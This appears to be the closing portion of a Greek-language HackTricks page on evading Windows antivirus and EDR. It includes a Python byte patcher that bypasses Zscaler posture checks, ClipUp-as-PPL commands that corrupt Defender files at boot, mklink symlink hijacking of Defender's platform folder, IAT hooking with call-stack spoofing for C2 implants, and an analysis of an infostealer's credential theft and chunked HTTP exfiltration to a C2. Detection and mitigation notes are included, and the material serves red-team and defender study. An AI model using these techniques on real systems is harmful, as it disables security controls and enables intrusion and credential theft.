| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και unsigned) διαδικασία μπορεί να δεσμεύσει τα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Παρακάμπτονται |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλα** τα posture checks εμφανίζουν **πράσινο/συμμορφούμενο**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι καθαρά client-side αποφάσεις εμπιστοσύνης και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγα byte patches.

## Κατάχρηση Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) επιβάλλει μια signer/level ιεραρχία ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να παραποιούν η μία την άλλη. Επιθετικά, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια ακίνδυνη λειτουργικότητα (π.χ. logging) σε ένα περιορισμένο, PPL-backed write primitive προς προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.

What makes a process run as PPL
- Το target EXE (και οποιαδήποτε loaded DLLs) πρέπει να είναι υπογεγραμμένο με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Παράδειγμα χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο συστημικό δυαδικό `C:\Windows\System32\ClipUp.exe` αυτο-εκκινεί και δέχεται παράμετρο για να γράψει ένα αρχείο καταγραφής σε διαδρομή που καθορίζει ο καλών.
- Όταν εκκινείται ως PPL process, η εγγραφή αρχείου γίνεται με PPL backing.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε συνήθως προστατευμένες τοποθεσίες.

8.3 short path helpers
- Λίστα σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Παράγωγη σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Δώστε το όρισμα log-path του ClipUp για να αναγκάσετε τη δημιουργία αρχείου σε προστατευμένο κατάλογο AV (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειαστεί.
3) Εάν το στοχευόμενο binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV κατά την εκτέλεση (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή στην εκκίνηση πριν ξεκινήσει το AV εγκαθιστώντας μια auto-start υπηρεσία που τρέχει αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Σε επανεκκίνηση, η PPL-backed εγγραφή συμβαίνει πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το στοχευόμενο αρχείο και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp πέρα από τη θέση· το primitive είναι κατάλληλο για αλλοίωση παρά για ακριβή έγχυση περιεχομένου.
- Απαιτεί τοπικό admin/SYSTEM για εγκατάσταση/εκκίνηση υπηρεσίας και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθη επιχειρήματα, ειδικά εάν έχει ως γονέα μη τυπικούς εκκινητές, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες για αυτόματη εκκίνηση ύποπτων binaries και που εκκινούν σταθερά πριν από Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από σφάλματα εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων στα Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR τηλεμετρία: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από μη-AV binaries.

Μέτρα μετριασμού
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποια parents· μπλοκάρετε την εκκίνηση του ClipUp εκτός νόμιμων πλαισίων.
- Καλή υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση auto-start services και παρακολουθήστε την παραποίηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· διερευνήστε σφάλματα εκκίνησης που υποδηλώνουν καταστροφή binaries.
- Σκεφτείτε την απενεργοποίηση της δημιουργίας 8.3 short-name σε volumes που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

Αναφορές για PPL και εργαλεία
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender επιλέγει την πλατφόρμα από την οποία τρέχει με την απαρίθμηση των υποφακέλων υπό:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με το υψηλότερο λεξικογραφικό version string (π.χ., `4.18.25070.5-0`), και ξεκινά από εκεί τις διεργασίες υπηρεσίας Defender (ενημερώνοντας ανάλογα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται καταχωρήσεις καταλόγου, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να εκμεταλλευτεί αυτό για να ανακατευθύνει τον Defender σε διαδρομή writable από επιτιθέμενο και να επιτύχει DLL sideloading ή διαταραχή υπηρεσίας.

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για δημιουργία καταλόγων/symlinks υπό το φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή πρόκλησης επανα-επιλογής πλατφόρμας Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Ο Defender μπλοκάρει εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται καταχωρήσεις καταλόγου και επιλέγει το λεξικογραφικά υψηλότερο version χωρίς να επικυρώνει ότι ο στόχος επιλύεται σε προστατευμένη/έμπιστη διαδρομή.

Βήμα-βήμα (παράδειγμα)
1) Ετοιμάστε ένα writable clone του τρέχοντος φακέλου platform, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε έναν symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (reboot recommended):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή διεργασίας στο `C:\TMP\AV\` και τη διαμόρφωση/registry της υπηρεσίας να αντικατοπτρίζει αυτή την τοποθεσία.

Post-exploitation options
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLLs που ο Defender φορτώνει από τον application directory του για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink ώστε στην επόμενη εκκίνηση η ρυθμισμένη διαδρομή να μην επιλύεται και ο Defender να μην ξεκινά:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της ανύψωση προνομίων· απαιτούνται δικαιώματα διαχειριστή.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν την αποφυγή ανίχνευσης σε runtime έξω από το C2 implant και μέσα στο ίδιο το στοχευόμενο module, κάνοντας hook στο Import Address Table (IAT) και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει την αποφυγή πέρα από τη μικρή επιφάνεια API που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Τοποθετήστε ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι αυτοτελές και position‑independent.
- Κατά τη φόρτωση του host DLL, περιηγηθείτε στο IMAGE_IMPORT_DESCRIPTOR και επιδιορθώστε (patch) τις εγγραφές IAT για τα στοχευμένα imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί τεχνικές αποφυγής πριν κάνει tail‑call στη πραγματική διεύθυνση του API. Συνηθισμένες τεχνικές περιλαμβάνουν:
  - Mask/unmask μνήμης γύρω από την κλήση (π.χ., encrypt beacon regions, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σε σελίδες) και επαναφορά μετά την κλήση.
  - Call‑stack spoofing: κατασκευάστε ένα benign stack και μεταβείτε στο target API ώστε η ανάλυση του call‑stack να επιλύεται σε αναμενόμενα frames.
  - Για συμβατότητα, εξάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να εγγράψει ποια APIs θα κάνουν hook για Beacon, BOFs και post‑ex DLLs.

Why IAT hooking here
- Λειτουργεί για οποιονδήποτε κώδικα που χρησιμοποιεί το hooked import, χωρίς να τροποποιεί τον κώδικα των εργαλείων ή να βασίζεται στο Beacon για να κάνει proxy συγκεκριμένα APIs.
- Καλύπτει post‑ex DLLs: το hooking του LoadLibrary* σας επιτρέπει να παρεμποδίσετε τις φόρτωσεις modules (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόσετε την ίδια masking/stack evasion στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση εντολών post‑ex που δημιουργούν processes απέναντι σε ανιχνεύσεις βάσει call‑stack, τυλίγοντας το CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν την πρώτη χρήση του import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυστρωματική `check_antivm` λογική

- Variant A διατρέχει τη λίστα διεργασιών, κατακερματίζει κάθε όνομα με έναν προσαρμοσμένο rolling checksum, και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes· επαναλαμβάνει το checksum στο όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας όπως `C:\analysis`.
- Variant B επιθεωρεί ιδιότητες συστήματος (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει VirtualBox additions, και εκτελεί timing checks γύρω από sleeps για να ανιχνεύσει single-stepping. Οποιαδήποτε ανίχνευση προκαλεί abort πριν την εκκίνηση των modules.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE ενσωματώνει έναν Chromium credential helper που είτε απορρίπτεται στο δίσκο είτε γίνεται manually mapped in-memory· το fileless mode επιλύει imports/relocations μόνο του ώστε να μην εγγράφονται helper artifacts.
- Εκείνος ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (two 32-byte keys + 12-byte nonces). Μετά και τις δύο διεργασίες, reflectively loads το blob (no `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` προερχόμενα από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ρουτίνες ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για injection σε ζωντανό Chromium browser, κληρονομούν AppBound Encryption keys, και αποκρυπτογραφούν passwords/cookies/credit cards απευθείας από SQLite βάσεις δεδομένων παρά το ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- Η `create_memory_based_log` επαναλαμβάνει έναν global `memory_generators` function-pointer table και spawn-άρει ένα νήμα ανά ενεργό module (Telegram, Discord, Steam, screenshots, documents, browser extensions, κ.λπ.). Κάθε νήμα γράφει αποτελέσματα σε shared buffers και αναφέρει τον αριθμό αρχείων μετά από ένα ~45s join window.
- Μόλις ολοκληρωθεί, όλα συμπιέζονται με την statically linked `miniz` library ως `%TEMP%\\Log.zip`. Η `ThreadPayload1` ύστερα κοιμάται 15s και streams το αρχείο σε 10 MB chunks μέσω HTTP POST στο `http://<C2>:6767/upload`, spoofing ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικό `w: <campaign_tag>`, και το τελευταίο chunk προσθέτει `complete: true` ώστε το C2 να γνωρίζει ότι η επανασυναρμολόγηση ολοκληρώθηκε.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
